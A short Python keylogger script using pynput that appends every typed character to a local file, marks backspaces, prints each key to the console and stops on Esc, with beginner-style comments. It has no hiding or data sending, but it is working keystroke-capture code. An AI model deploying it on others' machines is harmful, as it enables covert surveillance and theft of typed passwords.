
import pynput 

from pynput.keyboard import Key, Listener

count = 0 #The count of characters in keys list after which the list is written to the file
keys = [] #List to store pressed keys/characters

def keypress(key):
    global keys, count #declaring keys and count as global so they can be accessed anywhere in or out of the function

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >=1: # every character is written to file as soon as it is pressed so count greater than equal to 1
        count = 0
        write_to_file(keys)
        keys = []

# function to write to file
def write_to_file(keys):
    with open("key.txt", "a") as f: #for the 1st time if you don't want to create a file then use 'w' in place of 'a' but from next time you will need to use 'a' to append to the text file
        for key in keys:
            k = str(key).replace("'","")
            if k.startswith("Key.space"): # if spacebar is pressed we print new line so as to understand easily
                f.write("\n")
            elif k.startswith("Key.back"): #Backspace pressed is written to file with newline at end and start
                f.write("\nBackspace pressed\n")
            elif k.find("Key") == -1: # whenever the character pressed doesn't have word 'Key' which is there when shift ,ctrl etc is pressed, the character is written to file
                f.write(k)

# function to stop the program is to press esc key
def keyrelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=keypress, on_release=keyrelease) as listener:
    listener.join()
